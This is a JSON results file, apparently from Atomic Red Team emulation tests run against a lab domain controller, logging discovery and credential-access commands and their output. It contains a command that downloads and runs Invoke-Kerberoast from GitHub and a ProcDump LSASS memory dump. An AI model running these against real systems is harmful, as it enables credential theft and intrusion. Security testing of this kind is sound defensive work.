@@ -1,0 +1,258 @@
+{
+  "job_id": "9e0a32bb-57b3-41f2-8e1e-41f3dd495f07",
+  "targets": [
+    {
+      "target_id": "dc01",
+      "name": "DC01",
+      "os_platform": "windows",
+      "privilege": "admin",
+      "connection": "remote",
+      "domain_joined": true,
+      "host": "192.168.50.162",
+      "notes": ""
+    }
+  ],
+  "summary": {
+    "target_count": 1,
+    "total_tests": 15,
+    "succeeded": 4,
+    "failed": 11,
+    "skipped": 0
+  },
+  "by_target": [
+    {
+      "target": {
+        "target_id": "dc01",
+        "name": "DC01",
+        "os_platform": "windows",
+        "privilege": "admin",
+        "connection": "remote",
+        "domain_joined": true,
+        "host": "192.168.50.162",
+        "notes": ""
+      },
+      "summary": {
+        "total_tests": 15,
+        "succeeded": 4,
+        "failed": 11,
+        "skipped": 0,
+        "tactics_tested": [
+          "discovery",
+          "credential-access"
+        ]
+      },
+      "results": [
+        {
+          "technique_id": "T1033",
+          "test_name": "System Owner/User Discovery",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: Bad HTTP response returned from the server. Code: 400, Content: ''",
+          "command_executed": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"localhost\"\nquser\nqwinsta.exe /server:localhost\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n",
+          "duration_ms": 1031,
+          "timestamp": "2026-06-13T01:52:28.858644"
+        },
+        {
+          "technique_id": "T1082",
+          "test_name": "System Information Discovery",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: HTTPConnectionPool(host='192.168.50.162', port=5985): Read timed out. (read timeout=30)",
+          "command_executed": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n",
+          "duration_ms": 31406,
+          "timestamp": "2026-06-13T01:53:00.270798"
+        },
+        {
+          "technique_id": "T1016",
+          "test_name": "System Network Configuration Discovery on Windows",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: HTTPConnectionPool(host='192.168.50.162', port=5985): Read timed out. (read timeout=30)",
+          "command_executed": "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n",
+          "duration_ms": 30046,
+          "timestamp": "2026-06-13T01:53:30.309250"
+        },
+        {
+          "technique_id": "T1087.002",
+          "test_name": "Enumerate all accounts (Domain)",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": 1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "\r\nUser accounts for \\\\\r\n\r\n-------------------------------------------------------------------------------\r\nAdministrator            Alice.Smith              Bob.Jones                \r\nCharlie.Brown            Diana.Prince             Guest                    \r\nkrbtgt                   sql_service              svc_backup               \r\nsvc_deploy               svc_monitor              web_service              \r\nThe command completed with one or more errors.\r\n\r\n",
+          "stderr": "",
+          "command_executed": "net user /domain\nnet group /domain\n",
+          "duration_ms": 3390,
+          "timestamp": "2026-06-13T01:53:33.710602"
+        },
+        {
+          "technique_id": "T1069.002",
+          "test_name": "Basic Permission Groups Discovery Windows (Domain)",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: Bad HTTP response returned from the server. Code: 400, Content: ''",
+          "command_executed": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n",
+          "duration_ms": 31,
+          "timestamp": "2026-06-13T01:53:33.743204"
+        },
+        {
+          "technique_id": "T1087.001",
+          "test_name": "Enumerate all accounts on Windows (Local)",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": 1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "\r\nUser accounts for \\\\\r\n\r\n-------------------------------------------------------------------------------\r\nAdministrator            Alice.Smith              Bob.Jones                \r\nCharlie.Brown            Diana.Prince             Guest                    \r\nkrbtgt                   sql_service              svc_backup               \r\nsvc_deploy               svc_monitor              web_service              \r\nThe command completed with one or more errors.\r\n\r\n",
+          "stderr": "",
+          "command_executed": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n",
+          "duration_ms": 406,
+          "timestamp": "2026-06-13T01:53:34.143950"
+        },
+        {
+          "technique_id": "T1069.001",
+          "test_name": "Basic Permission Groups Discovery Windows (Local)",
+          "tactic": "discovery",
+          "success": true,
+          "exit_code": 0,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "\r\nAliases for \\\\WIN-G4RJOIM66GC\r\n\r\n-------------------------------------------------------------------------------\r\n*Access Control Assistance Operators\r\n*Account Operators\r\n*Administrators\r\n*Allowed RODC Password Replication Group\r\n*Backup Operators\r\n*Cert Publishers\r\n*Certificate Service DCOM Access\r\n*Cryptographic Operators\r\n*Denied RODC Password Replication Group\r\n*Distributed COM Users\r\n*DnsAdmins\r\n*Event Log Readers\r\n*Guests\r\n*Hyper-V Administrators\r\n*IIS_IUSRS\r\n*Incoming Forest Trust Builders\r\n*Network Configuration Operators\r\n*Performance Log Users\r\n*Performance Monitor Users\r\n*Pre-Windows 2000 Compatible Access\r\n*Print Operators\r\n*RAS and IAS Servers\r\n*RDS Endpoint Servers\r\n*RDS Management Servers\r\n*RDS Remote Access Servers\r\n*Remote Desktop Users\r\n*Remote Management Users\r\n*Replicator\r\n*Server Operators\r\n*Storage Replica Administrators\r\n*Terminal Server License Servers\r\n*Users\r\n*Windows Authorization Access Group\r\nThe command completed successfully.\r\n\r\n",
+          "stderr": "",
+          "command_executed": "net localgroup\nnet localgroup \"Administrators\"\n",
+          "duration_ms": 343,
+          "timestamp": "2026-06-13T01:53:34.488027"
+        },
+        {
+          "technique_id": "T1201",
+          "test_name": "Examine local password policy - Windows",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: Bad HTTP response returned from the server. Code: 400, Content: ''",
+          "command_executed": "net accounts\n",
+          "duration_ms": 31,
+          "timestamp": "2026-06-13T01:53:34.521850"
+        },
+        {
+          "technique_id": "T1135",
+          "test_name": "Network Share Discovery command prompt",
+          "tactic": "discovery",
+          "success": true,
+          "exit_code": 0,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "Shared resources at \\\\192.168.50.162\r\n\r\n\r\n\r\nShare name  Type  Used as  Comment              \r\n\r\n-------------------------------------------------------------------------------\r\nNETLOGON    Disk           Logon server share   \r\nSYSVOL      Disk           Logon server share   \r\nThe command completed successfully.\r\n\r\n",
+          "stderr": "",
+          "command_executed": "net view \\\\192.168.50.162\n",
+          "duration_ms": 593,
+          "timestamp": "2026-06-13T01:53:35.105306"
+        },
+        {
+          "technique_id": "T1049",
+          "test_name": "System Network Connections Discovery",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: Bad HTTP response returned from the server. Code: 400, Content: ''",
+          "command_executed": "netstat -ano\nnet use\nnet sessions 2>nul\n",
+          "duration_ms": 16,
+          "timestamp": "2026-06-13T01:53:35.134799"
+        },
+        {
+          "technique_id": "T1057",
+          "test_name": "Process Discovery - tasklist",
+          "tactic": "discovery",
+          "success": true,
+          "exit_code": 0,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "\r\nImage Name                     PID Session Name        Session#    Mem Usage\r\n========================= ======== ================ =========== ============\r\nSystem Idle Process              0 Services                   0          8 K\r\nSystem                           4 Services                   0        160 K\r\nRegistry                       136 Services                   0     72,740 K\r\nsmss.exe                       356 Services                   0      1,144 K\r\ncsrss.exe                      456 Services                   0      5,568 K\r\nwininit.exe                    536 Services                   0      7,012 K\r\ncsrss.exe                      548 Console                    1      5,792 K\r\nservices.exe                   620 Services                   0     13,876 K\r\nwinlogon.exe                   644 Console                    1     24,448 K\r\nlsass.exe                      676 Services                   0     93,848 K\r\nsvchost.exe                    940 Services                   0      3,948 K\r\nsvchost.exe                    964 Services                   0     22,244 K\r\nsvchost.exe                   1012 Services                   0     12,200 K\r\nsvchost.exe                      8 Services                   0      8,056 K\r\ndwm.exe                        528 Console                    1     93,352 K\r\nsvchost.exe                   1044 Services                   0     10,176 K\r\nsvchost.exe                   1108 Services                   0      7,436 K\r\nsvchost.exe                   1116 Services                   0      9,784 K\r\nsvchost.exe                   1124 Services                   0     11,868 K\r\nsvchost.exe                   1140 Services                   0     18,504 K\r\nsvchost.exe                   1260 Services                   0      7,896 K\r\nsvchost.exe                   1268 Services                   0      9,252 K\r\nsvchost.exe                   1460 Services                   0     13,976 K\r\nsvchost.exe                   1500 Services                   0     12,532 K\r\nsvchost.exe                   1532 Services                   0     20,380 K\r\nsvchost.exe                   1632 Services                   0      8,696 K\r\nsvchost.exe                   1660 Services                   0     14,816 K\r\nVBoxService.exe               1788 Services                   0      7,080 K\r\nsvchost.exe                   1844 Services                   0      5,812 K\r\nsvchost.exe                   1852 Services                   0      8,116 K\r\nsvchost.exe                   1860 Services                   0     11,836 K\r\nsvchost.exe                   2024 Services                   0      8,452 K\r\nsvchost.exe                   1440 Services                   0      9,328 K\r\nsvchost.exe                   1972 Services                   0      9,228 K\r\nsvchost.exe                   2136 Services                   0     11,988 K\r\nsvchost.exe                   2188 Services                   0      8,144 K\r\nsvchost.exe                   2304",
+          "stderr": "",
+          "command_executed": "tasklist\n",
+          "duration_ms": 1843,
+          "timestamp": "2026-06-13T01:53:36.966496"
+        },
+        {
+          "technique_id": "T1012",
+          "test_name": "Query Registry",
+          "tactic": "discovery",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: Bad HTTP response returned from the server. Code: 400, Content: ''",
+          "command_executed": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogo",
+          "duration_ms": 389,
+          "timestamp": "2026-06-13T01:53:37.363411"
+        },
+        {
+          "technique_id": "T1518",
+          "test_name": "Find and Display Internet Explorer Browser Version",
+          "tactic": "discovery",
+          "success": true,
+          "exit_code": 0,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\r\n    svcVersion    REG_SZ    11.1790.17763.0\r\n\r\n",
+          "stderr": "",
+          "command_executed": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n",
+          "duration_ms": 313,
+          "timestamp": "2026-06-13T01:53:37.670167"
+        },
+        {
+          "technique_id": "T1558.003",
+          "test_name": "Request for service tickets",
+          "tactic": "credential-access",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: Bad HTTP response returned from the server. Code: 400, Content: ''",
+          "command_executed": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n",
+          "duration_ms": 30,
+          "timestamp": "2026-06-13T01:53:37.702577"
+        },
+        {
+          "technique_id": "T1003.001",
+          "test_name": "Dump LSASS.exe Memory using ProcDump",
+          "tactic": "credential-access",
+          "success": false,
+          "exit_code": -1,
+          "skipped": false,
+          "skip_reason": "",
+          "stdout": "",
+          "stderr": "WinRM execution error: Received a WSManFault message. (Code: 2147942405, Machine: 192.168.50.162, Reason: Access is denied., Provider: Shell cmd plugin, Provider Path: %systemroot%\\system32\\winrscmd.dll, Provider Fault: Access is denied.)",
+          "command_executed": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n",
+          "duration_ms": 187,
+          "timestamp": "2026-06-13T01:53:37.895153"
+        }
+      ]
+    }
+  ]
+}
